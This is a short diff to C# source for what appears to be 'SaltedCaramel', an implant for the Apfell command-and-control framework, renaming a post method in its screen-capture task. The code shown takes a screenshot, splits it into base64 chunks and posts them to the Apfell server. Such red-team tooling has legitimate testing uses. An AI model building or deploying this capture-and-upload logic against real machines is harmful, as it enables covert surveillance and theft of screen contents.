@@ -38,7 +38,7 @@ namespace SaltedCaramel.Tasks
                 // Number of chunks will always be one for screen capture task
                 // Receive file ID in response
                 SCTaskResp initial = new SCTaskResp("{\"total_chunks\": " + 1 + ", \"task\":\"" + taskId + "\"}", taskId);
-                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.SCPostResp(initial));
+                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
                 Debug.WriteLine($"[-] SendCapture - Received reply, file ID: " + reply.file_id);
 
                 // Convert chunk to base64 blob and create our FileChunk
@@ -51,8 +51,8 @@ namespace SaltedCaramel.Tasks
                 // Receive status in response
                 SCTaskResp response = new SCTaskResp(JsonConvert.SerializeObject(fc), taskId);
                 Debug.WriteLine($"[+] SendCapture - CHUNK SENT: {fc.chunk_num}");
-                string postReply = implant.SCPostResp(response);
-                Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.SCPostResp(response)}");
+                string postReply = implant.PostResponse(response);
+                Debug.WriteLine($"[-] SendCapture - RESPONSE: {implant.PostResponse(response)}");
 
                 // Tell the Apfell server file transfer is done
                 implant.SendComplete(taskId);
